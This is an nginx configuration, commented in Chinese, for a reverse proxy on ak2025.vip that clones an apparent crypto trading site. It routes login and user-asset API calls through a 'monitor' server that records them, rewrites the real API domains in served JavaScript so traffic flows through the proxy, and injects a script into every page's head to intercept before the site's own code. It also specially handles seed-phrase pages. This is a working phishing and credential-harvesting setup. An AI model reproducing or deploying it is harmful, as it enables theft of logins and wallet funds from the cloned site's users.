    server {
        listen 80;
        server_name ak2025.vip www.akapi1.com akapi1.com;
        return 301 https://$server_name$request_uri;
    }
    
    # ak2025.vip HTTPS代理 (主站点)
    server {
        listen 443 ssl http2;
        server_name ak2025.vip;
        
        # SSL证书配置
        ssl_certificate /etc/letsencrypt/live/ak2025.vip/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/ak2025.vip/privkey.pem;
        
        # SSL安全配置
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305
;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:50m;
        ssl_session_timeout 1d;
        ssl_session_tickets on;
        
        # ===== 拦截助记词展示页（只匹配 mnemonic.XX.html，不拦截 mnemoniccheck 等页面） =====
        location ~ ^/pages/center/security/mnemonic%.[a-z]+%.html$ {
            if ($is_args = "") {
                return 302 /pages/account/login.html;
            }
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host K937.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            proxy_http_version 1.1;
        }
        
        # ===== 监控服务相关路由 (优先匹配) =====
        
        # 管理后台
        location ^~ /admin {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_http_version 1.1;
            proxy_connect_timeout 30s;
            proxy_read_timeout 300s;
        }
        
        # 透明代理管理API
        location ^~ /api/ {
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_connect_timeout 30s;
            proxy_read_timeout 300s;
            
            # CORS支持（仅限管理后台）
            add_header Access-Control-Allow-Origin "https://ak2025.vip" always;
            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
            add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
            
            if ($request_method = 'OPTIONS') {
                return 204;
            }
        }
        
        # 聊天WebSocket
        location ^~ /chat {
            limit_conn addr 5;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_http_version 1.1;
            proxy_connect_timeout 5s;
            proxy_send_timeout 300s;
            proxy_read_timeout 300s;
        }
        
        # ===== 只拦截需要监控的API =====
        
        # 登录API - 经过监控服务器记录（正则精确匹配，只匹配 /RPC/Login，不匹配 /RPC/Login 开头的其他路径）
        location ~ ^/RPC/Login$ {
            limit_conn addr 10;
            limit_req zone=req_limit burst=20 nodelay;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 5s;
            proxy_send_timeout 10s;
            proxy_read_timeout 15s;
            proxy_http_version 1.1;
            proxy_next_upstream error timeout http_502 http_503;
            proxy_next_upstream_tries 1;
        }
        
        # 用户资产API - 经过监控服务器记录
        location ^~ /RPC/public_IndexData {
            limit_req zone=req_limit burst=20 nodelay;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 5s;
            proxy_send_timeout 10s;
            proxy_read_timeout 15s;
            proxy_http_version 1.1;
            proxy_next_upstream error timeout http_502;
        }
        
        # ===== 其他RPC请求直接转发到后端API =====
        location ~ ^/RPC/ {
            proxy_pass http://monitor_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host www.akapi1.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Accept $http_accept;
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
        }
        
        # ===== 路径修复规则 (解决移动端卡住问题) =====
        location = /content/css/iconfont.css {
            rewrite ^ /content/font/iconfont.css break;
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host K937.com;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }
        
        location = /content/js/cn.json {
            rewrite ^ /content/lang/cn.json break;
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host K937.com;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        }
        
        # ===== 静态资源缓存 =====
        location ~* %.(css|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ {
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host K937.com;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            expires 7d;
            add_header Cache-Control "public, max-age=604800, immutable";
        }
        
        # ===== JS文件需要替换API域名 =====
        location ~* %.js$ {
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            proxy_set_header Host K937.com;
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            
            # 替换JS中的API域名
            sub_filter_types application/javascript text/javascript;
            sub_filter_once off;
            sub_filter 'https://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2025.vip';
            sub_filter 'www.akapi1.com' 'ak2025.vip';
            sub_filter 'www.akapi3.com' 'ak2025.vip';
        }
        
        # ===== 默认代理配置 =====
        location / {
            proxy_pass https://k937_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            
            proxy_set_header Host K937.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # 强制桌面User-Agent
            proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
            
            # 增加超时时间，避免长时间无操作后连接失效
            proxy_connect_timeout 30s;
            proxy_send_timeout 300s;
            proxy_read_timeout 300s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # 连接失败时自动重试，避免ERR_FAILED
            proxy_next_upstream error timeout http_502 http_503 http_504;
            proxy_next_upstream_tries 2;
            proxy_next_upstream_timeout 3s;
            
            # 替换JS中的API域名
            sub_filter_types text/html text/javascript application/javascript;
            sub_filter_once off;
            sub_filter 'https://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'https://www.akapi3.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi1.com' 'https://ak2025.vip';
            sub_filter 'http://www.akapi3.com' 'https://ak2025.vip';
            
            # 注入聊天组件到<head>最开始，确保在其他脚本之前执行拦截
            sub_filter '<head>' '<head><script src="/chat/widget.js"></script>';
        }
    }
    
    # akapi1.com HTTPS代理 (API服务器)
    server {
        listen 443 ssl http2;
        server_name www.akapi1.com akapi1.com;
        
        ssl_certificate /etc/letsencrypt/live/ak2025.vip/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/ak2025.vip/privkey.pem;
        
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305
;
        ssl_prefer_server_ciphers off;
        ssl_session_cache shared:SSL:50m;
        ssl_session_timeout 1d;
        ssl_session_tickets on;
        
        # ===== 拦截登录API - 经过监控服务器（正则精确匹配）=====
        location ~ ^/RPC/Login$ {
            limit_conn addr 10;
            limit_req zone=req_limit burst=20 nodelay;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 5s;
            proxy_send_timeout 10s;
            proxy_read_timeout 15s;
            proxy_http_version 1.1;
            proxy_next_upstream error timeout http_502 http_503;
            proxy_next_upstream_tries 1;
        }
        
        # ===== 拦截用户资产API =====
        location ^~ /RPC/public_IndexData {
            limit_req zone=req_limit burst=20 nodelay;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_connect_timeout 5s;
            proxy_send_timeout 10s;
            proxy_read_timeout 15s;
            proxy_http_version 1.1;
            proxy_next_upstream error timeout http_502;
        }
        
        # ===== 拦截所有其他RPC请求 - 经过监控服务器实现负载均衡 =====
        location ~ ^/RPC/ {
            limit_req zone=req_limit burst=50 nodelay;
            
            proxy_pass http://monitor_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Accept $http_accept;
            proxy_set_header Authorization $http_authorization;
            proxy_connect_timeout 30s;
            proxy_send_timeout 30s;
            proxy_read_timeout 30s;
            proxy_http_version 1.1;
            proxy_next_upstream error timeout http_502;
        }
        
        location / {
            proxy_pass https://akapi1_backend;
            proxy_ssl_verify off;
            proxy_ssl_server_name on;
            
            proxy_set_header Host www.akapi1.com;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header User-Agent $http_user_agent;
            proxy_set_header Accept $http_accept;
            proxy_set_header Content-Type $http_content_type;
            proxy_set_header Authorization $http_authorization;
            
            # 增加超时时间，避免长时间无操作后连接失效
            proxy_connect_timeout 30s;
            proxy_send_timeout 300s;
            proxy_read_timeout 300s;
            proxy_http_version 1.1;
            proxy_set_header Connection "";
            
            # 连接失败时自动重试，避免ERR_FAILED
            proxy_next_upstream error timeout http_502 http_503 http_504;
            proxy_next_upstream_tries 2;
            proxy_next_upstream_timeout 3s;
            
            # CORS支持
            add_header Access-Control-Allow-Origin * always;
            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
            add_header Access-Control-Allow-Headers "DNT,User-Agent,X-Requested-With,If-Modified-Since,
Cache-Control,Content-Type,Range,Authorization" always;
            
            if ($request_method = 'OPTIONS') {
                add_header Access-Control-Allow-Origin * always;
                add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
                add_header Access-Control-Allow-Headers "DNT,User-Agent,X-Requested-With,If-Modified-Si
nce,Cache-Control,Content-Type,Range,Authorization" always;
                add_header Access-Control-Max-Age 1728000 always;
                add_header Content-Type 'text/plain; charset=utf-8' always;
                add_header Content-Length 0 always;
                return 204;
            }
        }
    }